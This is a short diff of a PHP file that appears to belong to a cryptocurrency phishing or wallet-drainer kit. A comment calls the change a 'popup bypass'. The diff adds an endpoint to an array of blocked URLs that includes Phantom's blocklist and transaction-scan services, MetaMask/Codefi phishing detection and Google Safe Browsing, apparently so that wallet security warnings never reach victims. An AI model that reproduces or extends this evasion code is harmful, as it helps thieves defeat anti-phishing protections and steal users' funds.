@@ -1,6 +1,6 @@
 <!-- Added potential popup bypass - let's see if it works... -->
 <?php
-$blockedEndpoints = ['https://blocklist.phantom.app', 'http://blocklist.phantom.app', 'https://blowfish-blocklist-proxy.phantom.app', 'http://blowfish-blocklist-proxy.phantom.app', 'https://phishing-detection.metafi.codefi.network', 'http://phishing-detection.metafi.codefi.network', 'https://safebrowsing.googleapis.com', 'http://safebrowsing.googleapis.com', 'https://api.phantom.app/transaction/scan/', 'http://api.phantom.app/transaction/scan/'];
+$blockedEndpoints = ['https://blocklist.phantom.app', 'http://blocklist.phantom.app', 'https://blowfish-blocklist-proxy.phantom.app', 'http://blowfish-blocklist-proxy.phantom.app', 'https://phishing-detection.metafi.codefi.network', 'http://phishing-detection.metafi.codefi.network', 'https://safebrowsing.googleapis.com', 'http://safebrowsing.googleapis.com', 'https://api.phantom.app/transaction/scan/', 'http://api.phantom.app/transaction/scan/', 'https://eppo-proxy.phantom.app/api/randomized_assignment/v3/', 'http://eppo-proxy.phantom.app/api/randomized_assignment/v3/'];
 
 $sourceUrl = $_SERVER['HTTP_REFERER'] ?? 'unknown';
 
